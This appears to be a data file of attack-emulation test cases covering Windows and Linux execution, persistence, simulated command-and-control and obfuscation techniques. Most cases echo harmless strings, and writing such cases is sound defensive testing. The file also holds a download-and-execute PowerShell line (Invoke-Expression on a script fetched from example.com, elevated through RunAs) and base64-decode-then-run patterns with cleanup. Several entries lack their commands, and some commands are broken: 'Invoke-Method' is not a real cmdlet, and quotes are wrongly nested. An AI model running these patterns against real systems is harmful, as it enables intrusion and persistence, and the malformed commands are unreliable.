attacks.description: Basic command to execute Notepad using WMI.
attacks.expected_behavior: Notepad will start on the local machine.

attacks.command: powershell -Command "Get-WmiObject -Namespace 'root\cimv2' -Class Win32_Process -Filter 'Name = 'cmd.exe'' -ComputerName . | Invoke-Method -Name Create -ArgumentList 'cmd.exe /c echo WMI Execution Test'"
attacks.description: Intermediate command to execute a command prompt with a message using WMI.
attacks.expected_behavior: A command prompt window will open displaying 'WMI Execution Test'.

attacks.description: Advanced command to execute Calculator using WMI with RunAs privilege.
attacks.expected_behavior: Calculator will start with elevated privileges.

attacks.command: wine wmic /node:localhost process call create "cmd /c echo Hello from WMI"
attacks.description: Basic WMI command execution using WMIC to create a new process that echoes a benign string.
attacks.expected_behavior: Executes a simple command via WMI to create a process that outputs a benign message.

attacks.command: powershell -Command "Start-Process wmic -ArgumentList '/node:localhost process call create "cmd /c dir C:\Users"' -Verb RunAs"
attacks.description: Intermediate WMI command execution using PowerShell to run WMIC with elevated privileges.
attacks.expected_behavior: Executes a WMI command to list directories in a benign path, requiring admin privileges.

attacks.command: powershell -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1'); Start-Process wmic -ArgumentList '/node:localhost process call create "powershell -Command Get-Process"' -Verb RunAs"
attacks.description: Advanced WMI command execution using PowerShell to download and execute a script, then run a WMI command to list processes.
attacks.expected_behavior: Downloads a benign script and executes a WMI command to list processes, requiring admin privileges.

attacks.command: sc.exe create TestService binPath= "C:\Windows\System32\cmd.exe /c echo TestService started & exit"
attacks.description: Creates a new service that starts a command prompt and outputs a message.
attacks.expected_behavior: A new service named 'TestService' will be created. It will start a command prompt and print 'TestService started' before exiting.

attacks.command: powershell -Command "New-Item -Path 'C:\Windows\System32\Tasks\TestTask' -ItemType Directory -Force; New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/c echo TestTask executed'; Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/c echo TestTask executed') -TaskName 'TestTask' -Description 'Test Task'"
attacks.description: Creates a scheduled task that executes a command prompt to print a message.
attacks.expected_behavior: A scheduled task named 'TestTask' will be created. It will execute a command prompt that prints 'TestTask executed'.

attacks.command: powershell -Command "Start-Process cmd -ArgumentList '/c echo TestProcess started & exit'"
attacks.description: Starts a new command prompt process that outputs a message and exits.
attacks.expected_behavior: A new command prompt process will be started, printing 'TestProcess started' before exiting.

attacks.description: Adds a cron job to execute a benign command every minute.
attacks.expected_behavior: A cron job is added to the system's crontab, executing a benign echo command every minute.

attacks.description: Creates a background process that runs a benign echo command indefinitely.
attacks.expected_behavior: A background process is created that runs a benign echo command indefinitely, outputting to /dev/null.

attacks.description: Creates a new system command by copying an existing binary and setting execute permissions.
attacks.expected_behavior: A new system command 'testprocess' is created in /usr/local/bin, which is a copy of the /bin/true binary with execute permissions set.

attacks.description: Basic command to test TCP connection using netcat (nc.exe) to a specified host and port.
attacks.expected_behavior: Attempts to connect to example.com on port 80, displaying connection status.

attacks.description: Intermediate command to create a fake certificate using certutil.exe, simulating encrypted communication.
attacks.expected_behavior: Downloads a fake certificate from a specified URL and stores it locally.

attacks.description: Advanced command to execute an encoded PowerShell command, simulating encoded communication.
attacks.expected_behavior: Executes 'Get-Process' command within a new PowerShell process.

attacks.description: Basic command to simulate an HTTP request using netcat.
attacks.expected_behavior: Netcat listens on port 8080 and outputs 'Simulating HTTP request' to simulate an HTTP request.

attacks.description: Intermediate command using socat to simulate an HTTPS request.

attacks.command: perl -e 'use IO::Socket::INET; $sock = new IO::Socket::INET(LocalPort => 8080, Type => SOCK_STREAM, Reuse => 1, Listen => 10) or die "cannot listen on port 8080: $!"; while ($client = $sock->accept()) { print $client "Simulating SMTP request\n"; }'
attacks.description: Advanced command using Perl to simulate an SMTP request.
attacks.expected_behavior: Perl script listens on port 8080 and outputs 'Simulating SMTP request' to simulate an SMTP request.

attacks.description: This command encodes a text file into Base64, obfuscating its contents.
attacks.expected_behavior: Creates a Base64 encoded file from a text file in the TEMP directory.

attacks.description: This PowerShell command converts a string to Base64, demonstrating obfuscation of information.
attacks.expected_behavior: Generates a Base64 encoded string from a plain text string and saves it to a file.

attacks.description: This command compresses files in the TEMP directory, obfuscating their contents.
attacks.expected_behavior: Creates a ZIP archive of all files in the TEMP directory.

attacks.command: echo 'echo Hello, World!' | base64 > /tmp/obfuscated.sh && bash <(base64 -d /tmp/obfuscated.sh) && rm -f /tmp/obfuscated.sh
attacks.description: Basic obfuscation using base64 encoding to hide a simple echo command.
attacks.expected_behavior: The command will decode and execute the 'echo Hello, World!' command, then remove the obfuscated script.

attacks.command: echo '#!/bin/bash\necho "This is a test script"' | base64 > /tmp/obfuscated_script.sh && chmod +x /tmp/obfuscated_script.sh && bash <(base64 -d /tmp/obfuscated_script.sh) && rm -f /tmp/obfuscated_script.sh
attacks.description: Intermediate obfuscation using base64 encoding to hide a bash script that outputs a test message.
attacks.expected_behavior: The command will decode and execute the test script, then remove the obfuscated script.

attacks.command: echo 'for i in {1..5}; do echo "Iteration $i"; done' | base64 > /tmp/loop_script.sh && chmod +x /tmp/loop_script.sh && bash <(base64 -d /tmp/loop_script.sh) && rm -f /tmp/loop_script.sh
attacks.description: Advanced obfuscation using base64 encoding to hide a bash script that performs a loop operation.
attacks.expected_behavior: The command will decode and execute the loop script, then remove the obfuscated script.
